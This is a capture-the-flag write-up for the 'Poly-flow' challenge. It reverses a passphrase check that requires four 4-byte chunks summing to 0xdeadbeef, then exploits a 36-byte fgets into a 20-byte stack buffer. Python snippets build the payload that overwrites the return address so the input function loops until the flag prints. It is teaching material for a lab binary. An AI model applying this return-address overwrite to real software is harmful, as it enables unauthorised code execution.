# Poly-flow

## Analysis

### Opening in Ghidra

![Main function](./images/ghidra_main.png?raw=true "Main")

Checking the main function we can see the executable takes an passphrase using `scanf` that is passed to the check function and its returned value is checked. If the returned value is not 0 then input function is called otherwise program is stopped with an incorrect message.

![Check function](./images/ghidra_check.png?raw=true "Check")

Analyzing check function it takes a string as input with the length of 16 and it splits it into 4 pieces of 4 bytes and adds them together and then it checks if the sum is equal to 0xdeadbeef if it's equal it return 1 else it returns 0 in all other cases.

![Input function](./images/ghidra_input.png?raw=true "Input")

The input function is where there is buffer overflow with changing the the return address.
It is a small function with a local variable (`local_1c`) and an "if condition" it checks if the variable `i` equal 0x5, if its equals we get our flag otherwise the value of `i` is incremented by one and then there is a call to fgets on local_1c variable but the length used is 0x24(36) but the length of `local_1c` variable is only 20 hence it is our exploit we can abuse this.

## Part One: Passing the check

### Reverse engineering the string

We can divide the number into 4 4-byte integer numbers and them make a string out of those pieces and concat them to get the required string

#### Code

```python
>>> n = 0xdeadbeef
>>> a = 0xdeadbeef // 4
>>> n % 4
3
>>> a = 0xdeadbeef // 4 + 1
>>> b = 0xdeadbeef // 4
>>> 
>>> a * 3 + b == n
True
>>> a_str = a.to_bytes(4, 'little')
>>> b_str = b.to_bytes(4, 'little')
>>> inp = a_str * 3 + b_str
>>> print(inp)
b'\xbco\xab7\xbco\xab7\xbco\xab7\xbbo\xab7'
>>> len(inp)
16
>>> 
```

## Part Two: Buffer-Overflow

### Changing return address

We have to overflow `local_1c` variable and such that input function is called again (5 times since we have to change the value of variable I to reach 5 we can confirm in gdb that it starts with 0)

### doing it in the gdb

setting the breakpoint at input function and analysis from the gdb we infer for input function

```python
addr_of_input_function = 0x8049860
ebp = 0xffffcca8
```

Providing the long recognizable string to program in gdb

![Input function](./images/input.png?raw=true "GDB_Input")

In this image the value of ebp is written to 0x67676767 which is `gggg` so the padding will be from a to f and then ebp and address of input function can come.

we will repeat 5 times and at the sixth time value of `i` will be changed to 5 and we will get the flag.

final input will be => "aaaabbbbccccddddeeeeffff + ebp + addr_of_input_function\n" * 5

#### Code for buffer-overflow

```python
padd = b"aaaabbbbccccddddeeeeffff"

ebp = 0xffffcca8
ebp = ebp.to_bytes(4, 'little')

addr = 0x8049860
addr = addr.to_bytes(4, 'little')

print(b"\n".join([padd + ebp + addr for i in range(5)]))
```

## [Complete exploit](./exploit.py "Exploit")
